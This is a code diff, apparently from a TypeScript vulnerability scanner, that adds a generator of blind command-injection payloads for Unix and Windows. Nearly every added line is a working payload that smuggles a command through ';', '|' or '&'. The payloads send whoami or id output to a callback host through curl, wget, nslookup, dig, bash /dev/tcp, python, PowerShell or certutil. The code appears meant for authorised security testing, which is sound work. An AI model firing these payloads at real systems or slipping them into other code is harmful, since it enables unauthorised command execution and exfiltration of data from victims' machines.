@@ -119,6 +119,92 @@ export function generateBlindSqliPayloads(callbackUrl: string): string[] {
   ];
 }
 
+/**
+ * Generate blind command injection payloads that phone home via HTTP or DNS.
+ *
+ * When command output is filtered/suppressed, OOB exfiltration is the only way
+ * to confirm code execution. These payloads use:
+ *   - curl/wget for HTTP callbacks (Unix)
+ *   - nslookup/dig for DNS exfiltration (Unix + Windows)
+ *   - PowerShell Invoke-WebRequest (Windows)
+ *   - Python/perl one-liners as fallbacks
+ *
+ * Each payload attempts to include the output of a benign command (whoami, id)
+ * in the callback URL for proof-of-exploitation.
+ */
+export function generateBlindCmdiPayloads(callbackUrl: string): Array<{
+  payload: string;
+  os: 'unix' | 'windows';
+  technique: string;
+}> {
+  const url = callbackUrl.replace(/\/+$/, '');
+  const host = extractHost(url);
+  const id = () => `bcmdi-${randomUUID().slice(0, 8)}`;
+
+  return [
+    // Unix: curl HTTP callback with whoami output
+    {
+      payload: `; curl ${url}/cb/${id()}?d=$(whoami)`,
+      os: 'unix' as const,
+      technique: 'curl-http-callback',
+    },
+    // Unix: wget HTTP callback
+    {
+      payload: `; wget -q -O /dev/null ${url}/cb/${id()}`,
+      os: 'unix' as const,
+      technique: 'wget-http-callback',
+    },
+    // Unix: DNS exfiltration via nslookup
+    {
+      payload: `; nslookup $(whoami).${id()}.${host}`,
+      os: 'unix' as const,
+      technique: 'nslookup-dns-exfil',
+    },
+    // Unix: DNS exfiltration via dig
+    {
+      payload: `; dig $(whoami).${id()}.${host}`,
+      os: 'unix' as const,
+      technique: 'dig-dns-exfil',
+    },
+    // Unix: curl with backtick execution
+    {
+      payload: '| curl ' + url + '/cb/' + id() + '?d=`id`',
+      os: 'unix' as const,
+      technique: 'pipe-curl-backtick',
+    },
+    // Unix: python one-liner HTTP callback
+    {
+      payload: `; python3 -c "import urllib.request;urllib.request.urlopen('${url}/cb/${id()}')"`,
+      os: 'unix' as const,
+      technique: 'python-http-callback',
+    },
+    // Unix: bash TCP redirect (no curl/wget needed)
+    {
+      payload: `; echo bcmdi > /dev/tcp/${host}/${extractPort(url)}/cb/${id()}`,
+      os: 'unix' as const,
+      technique: 'bash-tcp-redirect',
+    },
+    // Windows: PowerShell HTTP callback
+    {
+      payload: `& powershell -c "Invoke-WebRequest -Uri '${url}/cb/${id()}?d='+(whoami)"`,
+      os: 'windows' as const,
+      technique: 'powershell-iwr-callback',
+    },
+    // Windows: nslookup DNS exfiltration
+    {
+      payload: `& nslookup ${id()}.${host}`,
+      os: 'windows' as const,
+      technique: 'nslookup-dns-windows',
+    },
+    // Windows: certutil download (common LOLBin)
+    {
+      payload: `& certutil -urlcache -split -f ${url}/cb/${id()} NUL`,
+      os: 'windows' as const,
+      technique: 'certutil-callback',
+    },
+  ];
+}
+
 /** Extract the host (without protocol or port) from a URL string. */
 function extractHost(url: string): string {
   try {
